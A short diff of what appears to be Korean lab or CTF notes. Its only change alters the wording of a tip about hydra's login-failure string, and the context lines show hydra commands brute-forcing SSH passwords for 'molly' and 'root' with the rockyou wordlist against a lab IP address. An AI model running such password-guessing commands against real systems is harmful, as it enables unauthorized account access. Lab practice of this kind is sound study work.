@@ -193,7 +193,7 @@ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
 hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
 ```
 
-- 로그인 실패시 출력되는 문구(F=)를 정확히 지정해야 함
+- 로그인 실패시 출력되는 문구(F=)를 정확히 지정해야 합니다
 
 ---
 
